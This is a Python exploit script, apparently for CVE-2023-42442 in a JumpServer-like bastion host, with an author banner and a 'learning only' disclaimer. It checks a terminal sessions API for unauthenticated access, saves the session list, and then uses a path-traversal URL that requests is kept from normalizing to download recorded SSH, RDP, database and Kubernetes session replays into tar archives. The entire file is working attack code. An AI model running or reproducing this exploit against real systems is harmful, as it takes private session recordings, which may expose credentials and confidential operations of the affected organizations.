# -*- coding: utf-8 -*-
import argparse
import datetime
import gzip
import io
import json
import logging
import os
import sys
import tarfile
import tempfile
from urllib.parse import urljoin, urlparse
import colorlog
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
}
# 设置代理
PROXIES = {}


def banner():
    print('''
    
     ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██╗  ██╗██████╗ ██╗  ██╗██╗  ██╗██████╗ 
    ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ██║  ██║╚════██╗██║  ██║██║  ██║╚════██╗
    ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗███████║ █████╔╝███████║███████║ █████╔╝
    ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚════██║██╔═══╝ ╚════██║╚════██║██╔═══╝ 
    ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝           ██║███████╗     ██║     ██║███████╗
     ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝            ╚═╝╚══════╝     ╚═╝     ╚═╝╚══════╝
                                                                                                            
        @Auth: C1ph3rX13
        @Blog: https://c1ph3rx13.github.io
        @Note: 代码仅供学习使用，请勿用于其他用途                                                                                 
    ''')


def setup_color_logging():
    # 创建一个 colorlog 的日志记录器
    logger_setting = colorlog.getLogger()
    logger_setting.setLevel(logging.INFO)

    # 创建控制台处理器并设置格式
    console_handler = logging.StreamHandler(sys.stdout)
    console_formatter = colorlog.ColoredFormatter(
        '%(asctime)s - %(log_color)s%(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S',
        reset=True,
        log_colors={
            'DEBUG': 'cyan',
            'INFO': 'green',
            'WARNING': 'yellow',
            'ERROR': 'red',
            'CRITICAL': 'bold_red',
        }
    )
    console_handler.setFormatter(console_formatter)

    # 将处理器添加到日志记录器
    logger_setting.addHandler(console_handler)

    return logger_setting


def create_folder(target: str):
    url = urlparse(target)
    output_path = os.path.join(os.getcwd(), url.hostname)

    try:
        os.makedirs(output_path, exist_ok=True)
    except OSError as error:
        logger.warning('Failed to create the folder. Returning the path to a temporary folder: {}', error)
        output_path = tempfile.mkdtemp()

    return output_path


def check_api(target: str, output):
    sessions_url = urljoin(target, '/api/v1/terminal/sessions/')
    json_path = f'{output}/Sessions.json'
    try:
        with requests.Session() as client:
            sessions_resp = client.get(url=sessions_url, headers=headers, verify=False, proxies=PROXIES)
            if sessions_resp.status_code == 200:
                data = sessions_resp.json()
                logger.critical(f'Found {len(data)} Sessions')
                with open(json_path, 'w', encoding='utf-8') as f:
                    json.dump(data, f, ensure_ascii=False, indent=4)
                    return json_path, True
            else:
                logger.critical(f'Check Failed: %s', sessions_resp.headers)
    except requests.RequestException as error:
        logger.error('Request error or HTTP status error: %s', error)


def get_gzip_bytes(data):
    compressed_data = io.BytesIO()
    with gzip.GzipFile(fileobj=compressed_data, mode="wb") as f:
        f.write(data)
    return compressed_data.getvalue()


def exploit(target: str, output, json_path):
    # 定义文件类型
    windows_ext = ".replay.gz"
    linux_ext = ".cast.gz"

    replay_type = {
        "ssh": linux_ext,
        "sftp": linux_ext,
        "rdp": windows_ext,
        "telnet": linux_ext,
        "vnc": linux_ext,
        "winrm": linux_ext,
        "mysql": linux_ext,
        "mariadb": linux_ext,
        "oracle": linux_ext,
        "postgresql": linux_ext,
        "sqlserver": linux_ext,
        "clickhouse": linux_ext,
        "redis": linux_ext,
        "mongodb": linux_ext,
        "k8s": linux_ext,
        "http": linux_ext,
        "chatgpt": linux_ext,
    }

    # 加载已获取的 JSON 数据
    with open(json_path, 'r', encoding='utf-8') as f:
        logger.critical('Read sessions.json')
        json_data = json.load(f)

    # 需要获取的参数:
    for sessions in json_data:
        # 判断文件是否能回放
        if not sessions['can_replay']:
            logging.warning(f'Session [{sessions["id"]}] has no replay')
            continue
        try:
            # 获取 JSON 文件中的时间信息并格式化
            raw_time = datetime.datetime.strptime(sessions['date_start'], '%Y/%m/%d %H:%M:%S %z')
            start_time = raw_time.strftime('%Y-%m-%d')
        except ValueError as error:
            logging.error('Resolving time failed: {}', error)
            continue

        # 遍历 JSON 文件的 protocol 字段与回放文件类型，判断类型为: Windows 或者 Linux
        replay_ext = replay_type.get(str(sessions["protocol"]).lower(), None)
        # 判断回放文件类型是否为空
        if replay_ext is None:
            logger.error('Unknown Protocol: {}', sessions['protocol'])
            continue

        # 使用 JSON 数据组成下载的 URL
        replay_url = f'{target}/media/xpack/../replay/{start_time}/{sessions["id"]}{replay_ext}'
        # 使用 requests.Session() 发起下载请求
        # 需要保证 Url 中的 /../ 不被规范化去掉
        # httpx 会在发起请求前规范化 Url, requests 则不会
        with requests.Session() as s:
            prep_resp = requests.Request(method='GET', url=replay_url, headers=headers)
            prep = prep_resp.prepare()
            prep.url = replay_url
            download_resp = s.send(prep, verify=False)

            if download_resp.status_code != 200:
                logger.error(f'[{download_resp.status_code}] {replay_url}')
                continue

        # 将本地的 JSON 数据编码为 UTF-8 字节串
        json_bytes = json.dumps(json_data).encode("utf-8")
        # 获取压缩过的回放文件字节串，即发起下载请求后的响应流
        gz_bytes = get_gzip_bytes(download_resp.content)
        # 指定输出的 tar 文件路径和文件名
        # 会在当前脚本运行的目录下，创建输入目标的 hostname 的文件夹
        out_path = f'{output}/{sessions["id"]}.tar'

        with tarfile.open(out_path, mode='w') as tar:
            # 将压缩后的回放文件字节流添加到 tar 文件中
            gz_info = tarfile.TarInfo(name="{}{}".format(sessions["id"], replay_ext))
            gz_info.size = len(gz_bytes)
            tar.addfile(gz_info, io.BytesIO(gz_bytes))

            # 将 JSON 数据字节流添加到 tar 文件中
            json_info = tarfile.TarInfo(name="{}.json".format(sessions["id"]))
            json_info.size = len(json_bytes)
            tar.addfile(json_info, io.BytesIO(json_bytes))

        logger.critical("Downloaded: {}".format(out_path))


def run(target: str):
    output_path = create_folder(target)
    json_path, result = check_api(target, output_path)
    if result:
        exploit(target, output_path, json_path)
    else:
        logger.critical('Not Vulnerable')


if __name__ == '__main__':
    banner()
    # 日志记录器对象
    logger = setup_color_logging()

    parser = argparse.ArgumentParser(description='CVE-2023-42442 by C1ph3rX13.')
    parser.add_argument('-t', '--target', type=str, required=True, help='Target url')
    parser.add_argument("--proxy", type=str, required=False, help="Proxy Url")

    args = parser.parse_args()
    if args.proxy:
        if 'http' in args.proxy:
            PROXIES = {'http': f'{args.proxy}'}
            print(PROXIES)
        if 'https' in args.proxy:
            PROXIES = {'https': f'{args.proxy}'}

    run(args.target)
